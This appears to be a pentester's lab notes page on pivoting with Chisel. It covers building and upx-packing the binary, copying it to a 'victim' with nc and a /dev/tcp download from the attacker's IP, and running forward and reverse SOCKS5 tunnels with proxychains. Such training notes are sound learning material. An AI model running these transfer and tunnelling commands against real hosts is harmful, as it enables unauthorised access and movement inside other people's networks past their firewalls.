```shell-session
git clone https://github.com/jpillora/chisel.git
```

**Note:** Depending on the version of the `glibc` library installed on both (target and workstation) systems, there might be discrepancies that could result in an error. When this happens, it is important to compare the versions of the library on both systems, or we can use an older prebuilt version of `chisel`, which can be found in the `Releases` section of the GitHub repository.

## SOCKS PROXY

The Chisel listener will listen for incoming connections on port `1234` using SOCKS5 (`--socks5`) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.

We can start a client on our attack host and connect to the Chisel server.

## Shrinking binary size

view size

```
du -hs chisel
```

remove dev comments and some garble from go files and compile

```
go build -ldflags="-s -w"
```

```
└─# go build -ldflags="-s -w" -buildvcs=false
```

decrease even further with upx

```
upx brute chisel
```

from 15mbs to 3.8

```
└─# du -hs chisel
3.8M    chisel

```

---

## MOVING CHISEL

```
attckr$ cat chisel | nc -lvnp 9001
```

```
victim$ cat < /dev/tcp/10.10.16.40/9001 > chisel
```

```
chmod +x chisel
```

## Run chisel server

`victim runs as a server waiting for connections`

```
victim$ ./chisel server -p 9001 -v -socks5
```

`attacker runs as a client connecting to jumphost`

```
attacker$ ./chisel client -v 10.129.202.64:9001 socks
```

![](/images/Pasted image 20250705013241.png)

## Chisel Reverse Pivot

In the previous example, we used the compromised machine (Ubuntu) as our Chisel server, listing on port 1234. Still, there may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.

(block inbound allow outbound)
ATTCKER <-firewall<-victim
`in this scenario the attackerbox is the server`

#### Starting the Chisel Server on our Attack Host

```shell-session
KALI$ sudo ./chisel server --reverse -v -p 1234 --socks5
```

```
VICTIM$ ./chisel client -v 10.10.14.17:1234 R:socks
```

edit proxychains with socks5 entry

```shell-session
$ sudo nano  /etc/proxycha[TAB]

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080
```
